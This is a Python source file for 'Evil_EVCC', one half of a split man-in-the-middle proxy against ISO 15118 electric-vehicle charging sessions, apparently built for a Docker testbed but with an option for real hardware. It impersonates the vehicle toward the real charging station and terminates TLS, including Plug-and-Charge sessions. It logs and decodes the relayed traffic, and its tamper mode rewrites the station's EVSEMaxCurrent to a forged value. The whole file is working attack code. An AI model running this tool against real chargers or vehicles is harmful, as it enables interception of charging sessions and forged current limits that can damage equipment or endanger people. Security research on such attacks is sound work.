"""
Evil_EVCC -- the fake-EV half of the split HLC MITM.

Sits on proxy_net1, next to the real SECC, and genuinely terminates the HLC
session as a real EVCC would: issues its own SDP request, and its own TLS/
plain TCP client connection to whatever the real SECC's SDP response points
at, trusting the real SECC's root CA via
iso15118.shared.security.get_ssl_context(), the same call the real EVCC
itself makes. Because TLS is genuinely terminated here (not passed through
opaquely like proxy01.py's single-relay design), --debug/--tamper work on
TLS/PnC and ISO 15118-20 sessions too, not just plaintext -2 ones.

Listens on bridge_net for its counterpart, Evil_SECC (proxy/evil_secc.py),
which kicks off each session by sending a {"type": "sdp_request", ...}
control message once it sees the real EVCC's own SDP request. Everything
read from the real SECC is forwarded to Evil_SECC over the bridge (to relay
on to the real EVCC); everything Evil_SECC forwards (what the real EVCC
sent) is written to the real SECC. See README "Split proxy (Evil_SECC +
Evil_EVCC)" for the full topology.

One HLC session at a time, same simplifying assumption proxy01.py already
makes (a single real EVCC/SECC pair, one charging session at a time) -- not
a general-purpose multi-session proxy.
"""

import sys, os, json, socket, asyncio, datetime, argparse, ipaddress

# --------------------------------------------------------------------
# CLI options
# --------------------------------------------------------------------
parser = argparse.ArgumentParser(description="Evil_EVCC -- fake-EV half of the split HLC MITM")
parser.add_argument("--capture", action="store_true", help="Save packets to evil_evcc_capture.log")
parser.add_argument("--show-hex", action="store_true", help="Print packet hex previews")
parser.add_argument("--debug", action="store_true",
                     help="Print decoded EXI for SECC->EVCC messages as they're relayed. "
                          "Same effect as DEBUG=1.")
parser.add_argument("--tamper", action="store_true",
                     help="Tamper with EVSEMaxCurrent in ChargeParameterDiscoveryRes "
                          "(ISO 15118-2 AC sessions only; works in TLS/PnC mode too, unlike "
                          "proxy01.py's single-relay tamper, since TLS is genuinely "
                          "terminated here). Same effect as TAMPER=1.")
parser.add_argument("--secc-iface", metavar="IFACE",
                     help="Explicit interface name facing the real SECC, used instead of "
                          "auto-detecting by Docker subnet (proxy_net1). For real hardware.")
parser.add_argument("--bridge-port", type=int, default=int(os.environ.get("BRIDGE_PORT", "6000")),
                     help="TCP port to listen on for Evil_SECC's bridge_net connection "
                          "(default: 6000).")
args = parser.parse_args()

CAPTURE_FILE = "evil_evcc_capture.log"
SHOW_PACKET_HEX = args.show_hex
ENABLE_CAPTURE = args.capture
DEBUG_EXI = args.debug or os.environ.get("DEBUG") == "1"
TAMPER_ENABLED = args.tamper or os.environ.get("TAMPER") == "1"
TAMPER_NEW_CURRENT_A = int(os.environ.get("TAMPER_CURRENT_A", "63"))

# --------------------------------------------------------------------
# Project setup
# --------------------------------------------------------------------
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from common import (
    ProxyCodec, decode_with_fallback, discover_secc_evcc_interfaces,
    read_v2gtp_message, write_json_frame, read_json_frame,
    tamper_charge_parameter_discovery_res, MSG_DEF_NS,
)
from iso15118.shared.messages.sdp import SDPRequest, SDPResponse, Security, Transport
from iso15118.shared.messages.v2gtp import V2GTPMessage
from iso15118.shared.messages.enums import ISOV2PayloadTypes, Protocol
from iso15118.shared.security import get_ssl_context
from iso15118.shared.settings import load_shared_settings

# See evil_secc.py's identical call for why this is needed: get_ssl_context()
# reads iso15118.shared.settings.shared_settings directly, which is only
# populated by calling this -- normally done by the real EVCC's own
# iso15118/evcc/main.py on startup.
load_shared_settings()

LISTEN_HOST = '::'
SDP_MULTICAST_GROUP = 'ff02::1'
SDP_SERVER_PORT = 15118
SDP_TIMEOUT_S = 3


def log_and_capture(direction, data):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    print(f"[{ts}] {direction} {len(data)} bytes")
    if SHOW_PACKET_HEX:
        hex_preview = data.hex()
        if len(hex_preview) > 128:
            hex_preview = hex_preview[:128] + "..."
        print(f"    {hex_preview}")
    if ENABLE_CAPTURE:
        with open(CAPTURE_FILE, "a") as f:
            f.write(f"{ts} {direction} len={len(data)} data={data.hex()}\n")


async def discover_real_secc(security: Security, own_scope_id):
    """
    Our own genuine SDP exchange with the real SECC: send an SDPRequest
    asking for the same security mode the real EVCC asked Evil_SECC for,
    pinned to our proxy_net1 leg, and parse the response. Mirrors
    proxy01.py's udp_listen_and_print SDP relay step, but as the initiator
    instead of a relay -- construction/parsing reuses the real stack's own
    SDPRequest/SDPResponse/V2GTPMessage classes (same ones the real EVCC
    uses) rather than hand-rolled bytes.

    Returns (secc_ip: str, secc_port: int, tls_enabled: bool).
    Raises TimeoutError / ValueError on failure.
    """
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 1)
    if own_scope_id is not None:
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_IF, own_scope_id)

    sdp_request = SDPRequest(security, Transport.TCP)
    request_bytes = V2GTPMessage(
        Protocol.ISO_15118_2, ISOV2PayloadTypes.SDP_REQUEST, sdp_request.to_payload()
    ).to_bytes()
    sock.sendto(request_bytes, (SDP_MULTICAST_GROUP, SDP_SERVER_PORT))
    print(f"Sent our own SDP Request to the real SECC: {sdp_request}")

    sock.settimeout(SDP_TIMEOUT_S)
    try:
        response, _ = sock.recvfrom(4096)
    except socket.timeout:
        sock.close()
        raise TimeoutError("No SDP response from the real SECC")
    sock.close()

    # Protocol.UNKNOWN -- same reasoning as evil_secc.py's incoming parse:
    # SDP is exchanged before either side has settled on -2 vs -20.
    v2gtp_msg = V2GTPMessage.from_bytes(Protocol.UNKNOWN, response)
    sdp_response = SDPResponse.from_payload(v2gtp_msg.payload)
    print(f"Received SDP Response from the real SECC: {sdp_response}")

    secc_ip = str(ipaddress.IPv6Address(sdp_response.ip_address))
    return secc_ip, sdp_response.port, sdp_response.security == Security.TLS


async def handle_bridge_connection(bridge_reader, bridge_writer, own_scope_id):
    try:
        msg = await read_json_frame(bridge_reader)
    except asyncio.IncompleteReadError:
        return
    if msg.get("type") != "sdp_request":
        print(f"Unexpected first bridge message: {msg}")
        return

    security = Security(msg["security"])
    try:
        secc_ip, secc_port, tls_enabled = await discover_real_secc(security, own_scope_id)
    except Exception as e:
        print(f"Could not discover the real SECC: {e}")
        await write_json_frame(bridge_writer, {"type": "secc_unreachable", "reason": str(e)})
        return

    print(f"Connecting to real SECC at {secc_ip}%{own_scope_id}:{secc_port} "
          f"({'TLS' if tls_enabled else 'plain TCP'}) ...")
    try:
        ssl_context = get_ssl_context(False) if tls_enabled else None
        secc_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        secc_sock.bind((LISTEN_HOST, 0, 0, own_scope_id))
        secc_sock.connect((secc_ip, secc_port, 0, own_scope_id))
        secc_sock.setblocking(False)
        # server_hostname is only meaningful (and only accepted by
        # open_connection) when ssl is actually set -- get_ssl_context(False)
        # already sets check_hostname = False, so the value passed here isn't
        # used for verification, but SNI still wants something.
        conn_kwargs = {"sock": secc_sock}
        if ssl_context:
            conn_kwargs["ssl"] = ssl_context
            conn_kwargs["server_hostname"] = secc_ip
        secc_reader, secc_writer = await asyncio.open_connection(**conn_kwargs)
    except Exception as e:
        print(f"Could not connect to the real SECC: {e}")
        await write_json_frame(bridge_writer, {"type": "secc_unreachable", "reason": str(e)})
        return

    print(f"Connected to real SECC at {secc_ip}%{own_scope_id}:{secc_port}")
    await write_json_frame(bridge_writer, {"type": "secc_ready"})

    # A codec is only needed if something's actually going to decode with it
    # -- default pass-through stays zero-overhead.
    codec = ProxyCodec() if (DEBUG_EXI or TAMPER_ENABLED) else None

    async def secc_to_bridge():
        while True:
            try:
                header, payload = await read_v2gtp_message(secc_reader)
            except asyncio.IncompleteReadError:
                break

            out_header, out_payload = header, payload

            if codec:
                decoded, ns = await decode_with_fallback(codec, payload)
                if decoded is not None:
                    if TAMPER_ENABLED and ns == MSG_DEF_NS:
                        original_value = tamper_charge_parameter_discovery_res(
                            decoded, TAMPER_NEW_CURRENT_A)
                        if original_value is not None:
                            new_payload = await codec.encode(json.dumps(decoded), MSG_DEF_NS)
                            out_header = header[0:4] + len(new_payload).to_bytes(4, "big")
                            out_payload = new_payload
                            print(f"\n[TAMPER] EVSEMaxCurrent: {original_value}A -> "
                                  f"{TAMPER_NEW_CURRENT_A}A (ChargeParameterDiscoveryRes, "
                                  f"SECC→EVCC)\n")
                    if DEBUG_EXI:
                        print(f"\n[SECC→EVCC] Decoded EXI (ns={ns}):\n"
                              f"{json.dumps(decoded, indent=4)}\n")

            data = out_header + out_payload
            log_and_capture("SECC→EVCC", data)
            await write_json_frame(bridge_writer, {
                "type": "v2gtp", "direction": "secc_to_evcc",
                "header": out_header.hex(), "payload": out_payload.hex(),
            })

    async def bridge_to_secc():
        while True:
            try:
                msg = await read_json_frame(bridge_reader)
            except asyncio.IncompleteReadError:
                break
            if msg.get("type") != "v2gtp" or msg.get("direction") != "evcc_to_secc":
                continue
            data = bytes.fromhex(msg["header"]) + bytes.fromhex(msg["payload"])
            secc_writer.write(data)
            await secc_writer.drain()
            log_and_capture("EVCC→SECC", data)

    try:
        await asyncio.gather(secc_to_bridge(), bridge_to_secc())
    except Exception as e:
        print(f"Relay error: {e}")
    finally:
        secc_writer.close()
        await secc_writer.wait_closed()
        print("Closed connection with real SECC")


async def run(own_scope_id, bridge_port):
    async def _handle(r, w):
        addr = w.get_extra_info('peername')
        print(f"\nAccepted bridge connection from Evil_SECC: {addr}")
        try:
            await handle_bridge_connection(r, w, own_scope_id)
        finally:
            w.close()
            await w.wait_closed()
            print("Bridge connection closed -- listening for the next session\n")

    server = await asyncio.start_server(_handle, host="0.0.0.0", port=bridge_port)
    print(f"\nBridge listener for Evil_SECC on 0.0.0.0:{bridge_port}")
    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    roles = loop.run_until_complete(discover_secc_evcc_interfaces(secc_iface=args.secc_iface))

    detect_desc = "explicit --secc-iface" if args.secc_iface else "Docker subnet auto-detect"
    print(f"\nSECC-facing network interface (identified by {detect_desc}):")

    if "secc" not in roles:
        if args.secc_iface:
            print(f"ERROR: --secc-iface {args.secc_iface} did not resolve to a usable interface")
        else:
            print("ERROR: no interface found on the SECC subnet (172.20.0.0/16 / "
                  "2001:db8:1::/64) -- on real hardware, pass --secc-iface instead.")
        sys.exit(1)

    own_ip, own_scope_id = roles["secc"]
    print(f"  secc: {own_ip} -> scope {own_scope_id}")

    loop.run_until_complete(run(own_scope_id, args.bridge_port))
